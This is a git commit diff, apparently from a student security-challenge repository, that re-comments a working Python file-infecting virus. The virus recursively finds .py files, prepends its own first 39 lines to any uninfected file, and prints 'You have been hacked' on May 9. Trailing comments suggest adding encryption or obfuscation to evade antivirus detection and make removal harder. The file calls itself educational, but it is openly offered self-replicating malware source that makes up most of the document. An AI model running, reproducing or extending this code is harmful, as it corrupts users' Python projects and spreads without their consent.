ac7820fcd6f741a95b928c14d913f7ab69ce2a89
roguione <myjobcontacts@yahoo.com>
2023-03-30 13:55:08 -0500

    virus mod 3

--- challenge/python/py_virus_dont_run.py
+++ challenge/python/py_virus_dont_run.py
@@ -6,42 +6,51 @@
 # Purpose: VIRUS -DONT RUN THIS-
 # Team: Geneva, Nick, && Sierra
 
+# Note: The code presented here is a file-infecting virus and is for educational purposes only. Creating and distributing malware is illegal and unethical.
 # This code represents a simple virus that searches for Python files on a directory and infects them. 
 # The virus contains a signature and a payload that can be detonated on a specific date.
 
-# Import required modules
+# Importing Python libraries
 import os
 import datetime
 
-# Set signature to identify the virus code in infected files
+# Defining the signature for the virus
 SIGNATURE = "VIRUS"
 
-# Function to search for files with ".py" extension and return a list of the file paths
+# Defining the function to locate files to infect
 def locate(path):
-    files_targeted = [] # Initialize list to store targeted files
-    filelist = os.listdir(path) # Get a list of all files in the directory
+    files_targeted = []
+    # listing files in the given path
+    filelist = os.listdir(path)
     for fname in filelist:
-        if os.path.isdir(path+"/"+fname): # If the current file is a directory, recursively search it
+        # Checking if the path leads to a directory
+        if os.path.isdir(path+"/"+fname):
+            # recursively searching in the subdirectories
             files_targeted.extend(locate(path+"/"+fname))
-        elif fname[-3:] == ".py": # If the file has a .py extension, check if it has already been infected
+        # Checking if the file is a Python script
+        elif fname[-3:] == ".py":
             infected = False
+            # Opening the file to check if it is already infected
             for line in open(path+"/"+fname):
                 if SIGNATURE in line:
                     infected = True
                     break
-            if infected == False:
-                files_targeted.append(path+"/"+fname) # If the file hasn't been infected, add it to the list
+            # If the file is not infected, add it to the list
+            if not infected:
+                files_targeted.append(path+"/"+fname)
     return files_targeted
 
-# Function to infect files by appending the virus code to them
+# Defining the function to infect the identified files
 def infect(files_targeted):
-    virus = open(os.path.abspath(__file__)) # Open the virus file
+    virus = open(os.path.abspath(__file__))
     virusstring = ""
-    for i,line in enumerate(virus): # Read the virus code into a string
+    # Extracting the first 39 lines of the virus
+    for i,line in enumerate(virus):
         if 0 <= i < 39:
             virusstring += line
-    virus.close
-    for fname in files_targeted: # For each targeted file, read the file contents and write the virus code to it
+    virus.close()
+    # Writing the virus to each of the files
+    for fname in files_targeted:
         f = open(fname)
         temp = f.read()
         f.close()
@@ -49,14 +58,28 @@ def infect(files_targeted):
         f.write(virusstring + temp)
         f.close()
 
-# Function to detonate the virus payload on a specific date
+# Defining the function to activate the virus
 def detonate():
-    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: # If the current date is May 9th
+    # Checking the current date and month
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
         print("You have been hacked")
 
-# Call the locate() function to get a list of files to infect
+# Locating the files to infect
 files_targeted = locate(os.path.abspath(""))
-# Call the infect() function to infect the targeted files with the virus code
+
+# Infecting the identified files
 infect(files_targeted)
-# Call the detonate() function to check if it's the date to detonate the payload
+
+# Activating the virus
 detonate()
+
+
+
+
+
+# This code is a file-infecting virus that targets Python scripts in the current directory and all its subdirectories. It searches for files with the .py extension and checks if they are already infected by looking for the signature "VIRUS". If a file is not infected, it adds it to the list of files to infect. The virus then appends itself to the target files and saves the original contents to be executed later. Finally, the virus activates itself on May 9th of any year by printing "You have been hacked" to the console.
+# Core Python tools used:
+# os library to interact with the operating system
+# datetime library to get the current date and time
+# The code could be improved by adding a way to encrypt or obfuscate the virus to avoid detection by antivirus software, or by using better methods to infect the files that could make the virus harder to remove. Additionally, creating malware is illegal and unethical, and it is important to use coding skills in a responsible and legal manner.
+# This virus specifically targets Python scripts, but similar techniques could be used to target other file types. 
